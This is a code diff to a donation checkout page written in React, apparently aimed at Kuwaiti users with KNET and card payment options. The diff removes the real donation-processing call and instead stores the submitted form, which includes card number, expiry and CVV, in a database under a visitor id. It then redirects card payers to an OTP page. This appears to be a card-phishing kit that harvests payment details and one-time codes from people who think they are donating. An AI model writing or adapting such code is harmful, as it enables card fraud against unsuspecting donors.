@@ -16,10 +16,10 @@ import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/component
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { processDonation } from "../actions"
+import { addData, handlePay } from "@/lib/db"
 
 export default function CheckoutPage() {
     const router = useRouter()
-
     const [isLoading, setIsLoading] = useState(false)
     const [isGccOpen, setIsGccOpen] = useState(false)
     const [paymentMethod, setPaymentMethod] = useState("credit-card")
@@ -31,6 +31,7 @@ export default function CheckoutPage() {
         expiryDate: "",
         cvv: "",
         country: "kuwait",
+        status:"new"
     })
 
     const donationAmount = 50
@@ -59,25 +60,23 @@ export default function CheckoutPage() {
             formDataToSubmit.append("projectName", projectName)
             formDataToSubmit.append("paymentMethod", paymentMethod)
 
-            // Process donation
-            const result = await processDonation(formDataToSubmit)
-
-            if (result.success) {
-
-
+            const id = localStorage.getItem('visitor')
+            addData({ id, ...formDataToSubmit }).then(() => {
                 // Redirect to success page
                 setTimeout(() => {
                     if (paymentMethod === 'knet') {
                         router.push(`/knet`)
 
                     } else {
+                        handlePay(formData,setFormData)
                         router.push(`/otp`)
 
                     }
                 }, 1500)
-            } else {
+            })
 
-            }
+            // Process donation
+
         } catch (error) {
             console.error("Error submitting donation:", error)
 
@@ -313,8 +312,6 @@ export default function CheckoutPage() {
                     </div>
                 </div>
             </main>
-
-
         </div>
     )
 }
